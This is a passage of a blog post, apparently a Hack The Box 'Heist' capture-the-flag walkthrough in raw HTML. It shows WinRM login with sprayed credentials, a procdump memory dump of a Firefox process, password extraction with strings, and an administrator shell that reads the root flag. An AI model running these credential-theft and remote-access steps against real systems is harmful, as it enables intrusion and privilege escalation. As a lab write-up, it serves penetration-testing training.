<span class="o">[</span>-] 10.10.10.149: - LOGIN FAILED: WORKSTATION<span class="se">\a</span>dmin:stealth1agent <span class="o">(</span>Incorrect: <span class="o">)</span> 
<span class="o">[</span>+] 10.10.10.149:5985 - Login Successful: WORKSTATION<span class="se">\c</span>hase:Q4<span class="o">)</span>sJu<span class="se">\Y</span>8qz<span class="k">*</span>A3?d
</pre></table></code></div></div><p>we can see that chase can winrm. Using evil-winrm to get the shell.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>$evil-winrm -i 10.10.10.149 -u chase -p "Q4)sJu\Y8qz*A3?d" 
Evil-WinRM shell v3.4 
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine 
Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion 
Info: Establishing connection to remote endpoint 
*Evil-WinRM* PS C:\Users\Chase\Documents&gt;
</pre></table></code></div></div><h2 id="shell-as-administrator"><span class="mr-2">SHELL AS ADMINISTRATOR</span><a href="#shell-as-administrator" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Thereâ€™s a <code class="language-plaintext highlighter-rouge">todo list</code> in the chase desktop that says to keep checking the issues list, which can be done using a browser, browsing the support portal we found earlier.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; type todo.txt 
Stuff to-do: 
1. Keep checking the issues list. 
2. Fix the router config. 
Done: 
1. Restricted access for guest user.
</pre></table></code></div></div><p>running ps command we can see a bunch of <code class="language-plaintext highlighter-rouge">firefox process</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Desktop&gt; ps 
Handles  NPM(K)    PM(K)      WS(K)     CPU(s)     Id  SI ProcessName 
-------  ------    -----      -----     ------     --  -- ----------- 
    347      19    10232     287536       0.17    740   1 firefox 
    401      34    39024      96248       2.30   2944   1 firefox
   1065      71   149328     227156       8.34   3916   1 firefox
    378      28    23692      60496       1.33   5876   1 firefox
    356      25    16528      39016       0.17   6408   1 firefox
</pre></table></code></div></div><h2 id="get-creds-from-firefox"><span class="mr-2">GET CREDS FROM FIREFOX</span><a href="#get-creds-from-firefox" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><p>Using <code class="language-plaintext highlighter-rouge">procdump</code> from <code class="language-plaintext highlighter-rouge">sysinternals</code> tool to run against one of the process of <code class="language-plaintext highlighter-rouge">firefox</code>.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; upload procdump64.exe
Info: Uploading procdump64.exe to C:\Users\Chase\Documents\procdump64.exe


Data: 566472 bytes of 566472 bytes copied

Info: Upload successful!
</pre></table></code></div></div><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; .\procdump64 -ma 740 -accepteula

ProcDump v11.0 - Sysinternals process dump utility
Copyright (C) 2009-2022 Mark Russinovich and Andrew Richards
Sysinternals - www.sysinternals.com

[20:49:10] Dump 1 initiated: C:\Users\Chase\Documents\firefox.exe_230129_204910.dmp
[20:49:10] Dump 1 writing: Estimated dump file size is 288 MB.
[20:49:10] Dump 1 complete: 288 MB written in 0.4 seconds
[20:49:10] Dump count reached.
</pre></table></code></div></div><p>Downloading the dump.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>*Evil-WinRM* PS C:\Users\Chase\Documents&gt; download firefox.exe_230129_204910.dmp
</pre></table></code></div></div><p>Strings can be used to grep password from the dump file, and we got login usernamd and password from it.</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>$strings firefox.exe_230129_134546.dmp | grep password=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
RG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
MOZ_CRASHREPORTER_RESTART_ARG_1=localhost/login.php?login_username=admin@support.htb&amp;login_password=4dD!5}x/re8]FBuZ&amp;login=
            label-password="&amp;fillPasswordMenu.label;"
            accesskey-password="&amp;fillPasswordMenu.accesskey;"
            label-password="&amp;fillPasswordMenu.label;"
            accesskey-password="&amp;fillPasswordMenu.accesskey;"
</pre></table></code></div></div><p>and we got shell as administrator</p><div class="language-plaintext highlighter-rouge"><div class="code-header"> <span data-label-text="Plaintext"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>$evil-winrm -i 10.10.10.149 -u administrator  -p '4dD!5}x/re8]FBuZ'

Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;

*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami
supportdesk\administrator
*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
caf30de94a7ba38168831b756dee6dea

</pre></table></code></div></div></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/hackthebox/'>hackthebox</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/windows/" class="post-tag no-text-decoration" >windows</a> <a href="/tags/rpcclient/" class="post-tag no-text-decoration" >rpcclient</a> <a href="/tags/crackmapexec/" class="post-tag no-text-decoration" >crackmapexec</a> <a href="/tags/impacket-lookupsid/" class="post-tag no-text-decoration" >impacket-lookupsid</a> <a href="/tags/procdump/" class="post-tag no-text-decoration" >procdump</a> <a href="/tags/easy/" class="post-tag no-text-decoration" >easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Hack%20The%20Box%20-%20Heist%20-%20Niraj%20Maharjan&url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Hiest%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Hack%20The%20Box%20-%20Heist%20-%20Niraj%20Maharjan&u=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Hiest%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Hiest%2F&text=Hack%20The%20Box%20-%20Heist%20-%20Niraj%20Maharjan" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fniraj-maharjan.com.np%2Fposts%2FHack-The-Box-Hiest%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Hack-The-Box-Authority/">Hack The Box - Authority</a><li><a href="/posts/HAck-the-Box-Photobomb/">Hack The Box - Photobomb</a><li><a href="/posts/Hack-The-Box-Querier/">Hack The Box - Querier</a><li><a href="/posts/Ejptv2/">eLearnSecurity - eJPTv2</a><li><a href="/posts/Hack-The-Box-Hiest/">Hack The Box - Heist</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc"></nav></div><script src="https://cdn.jsdelivr.net/npm/tocbot@4.20.1/dist/tocbot.min.js"></script></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4 mt-5"><div id="related-posts" class="mb-2 mb-sm-4"><h3 class="pt-2 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Hack-The-Box-Active/"><div class="card-body"> <em class="small" data-ts="1674018000" data-df="ll" > Jan 18, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Active</h3><div class="text-muted small"><p> RECON NMAP Starting with nmap, nmap shows a bunch of open ports and the target is Active Directory Domain Controller running on Windows Server 2008 R2 SP1. $sudo nmap -sT -p- -oA alltcp 10.10...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Return/"><div class="card-body"> <em class="small" data-ts="1674882000" data-df="ll" > Jan 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Return</h3><div class="text-muted small"><p> Return was an easy box that involved exploiting a printerâ€™s web administration panel to obtain LDAP credentials. These credentials can then be used to access WinRM. The account obtained through t...</p></div></div></a></div><div class="card"> <a href="/posts/Hack-The-Box-Timelapse/"><div class="card-body"> <em class="small" data-ts="1674882000" data-df="ll" > Jan 28, 2023 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Hack The Box - Timelapse</h3><div class="text-muted small"><p> RECON NMAP Nmap shows multiple ports open. Since ldap, kerberos, DNS and SMB ports are open itâ€™s probably a Domain Controller. Nmap script shows that the domain name is timelapse.htb $nmap -Pn...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Hack-The-Box-Timelapse/" class="btn btn-outline-primary" prompt="Older"><p>Hack The Box - Timelapse</p></a> <a href="/posts/Ejptv2/" class="btn btn-outline-primary" prompt="Newer"><p>eLearnSecurity - eJPTv2</p></a></div><div id="disqus_thread" class="pt-2 pb-2"><p class="text-center text-muted small">Comments powered by <a href="https://disqus.com/">Disqus</a>.</p></div><script type="text/javascript"> var disqus_config = function () { this.page.url = 'https://niraj-maharjan.com.np/posts/Hack-The-Box-Hiest/'; this.page.identifier = '/posts/Hack-The-Box-Hiest/'; }; /* Lazy loading */ var disqus_observer = new IntersectionObserver( function (entries) { if (entries[0].isIntersecting) { (function () { var d = document, s = d.createElement('script'); s.src = 'https://nirazzz.disqus.com/embed.js'; s.setAttribute('data-timestamp', +new Date()); (d.head || d.body).appendChild(s); })(); disqus_observer.disconnect(); } }, { threshold: [0] } ); disqus_observer.observe(document.querySelector('#disqus_thread')); /* Auto switch theme */ function reloadDisqus() { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { /* Disqus hasn't been loaded */ if (typeof DISQUS === 'undefined') { return; } if (document.readyState == 'complete') { DISQUS.reset({ reload: true, config: disqus_config }); } } } if (document.querySelector('.mode-toggle')) { window.addEventListener('message', reloadDisqus); } </script></div></div></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/easy/">easy</a> <a class="post-tag" href="/tags/windows/">windows</a> <a class="post-tag" href="/tags/smbclient/">smbclient</a> <a class="post-tag" href="/tags/active-directory/">active directory</a> <a class="post-tag" href="/tags/cve/">cve</a> <a class="post-tag" href="/tags/metasploit/">metasploit</a> <a class="post-tag" href="/tags/smbmap/">smbmap</a> <a class="post-tag" href="/tags/active-directory/">Active Directory</a> <a class="post-tag" href="/tags/hashcat/">hashcat</a> <a class="post-tag" href="/tags/impacket-mssqlclient/">impacket-mssqlclient</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><footer><div class="container pl-lg-4 pr-lg-4"><div class="d-flex justify-content-between align-items-center text-muted ml-md-3 mr-md-3"><div class="footer-left"><p class="mb-0"> Â© 2025 <a href="https://twitter.com/username">Niraj Maharjan</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0">Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/mermaid@8/dist/mermaid.min.js"></script> <script> (function () { function updateMermaid(event) { if (event.source === window && event.data && event.data.direction === ModeToggle.ID) { const mode = event.data.message; if (typeof mermaid === "undefined") { return; } let expectedTheme = (mode === ModeToggle.DARK_MODE ? "dark" : "default"); let config = {theme: expectedTheme}; /* Re-render the SVG â€º <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function () { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } let initTheme = "default"; if ($("html[data-mode=dark]").length > 0 || ($("html[data-mode]").length == 0 && window.matchMedia("(prefers-color-scheme: dark)").matches)) { initTheme = "dark"; } let mermaidConf = { theme: initTheme /* <default|dark|forest|neutral> */ }; /* Create mermaid tag */ $("pre").has("code.language-mermaid").each(function () { let svgCode = $(this).children().html(); $(this).addClass("unloaded"); $(this).after(`<pre class=\"mermaid\">${svgCode}</pre>`); }); mermaid.initialize(mermaidConf); window.addEventListener("message", updateMermaid); })(); </script><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lazysizes@5.3.2/lazysizes.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script> /* see: <https://docs.mathjax.org/en/latest/options/input/tex.html#tex-options> */ MathJax = { tex: { /* start/end delimiter pairs for in-line math */ inlineMath: [ ['$', '$'], ['\\(', '\\)'] ], /* start/end delimiter pairs for display math */ displayMath: [ ['$$', '$$'], ['\\[', '\\]'] ] } }; </script> <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script> <script id="MathJax-script" async src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
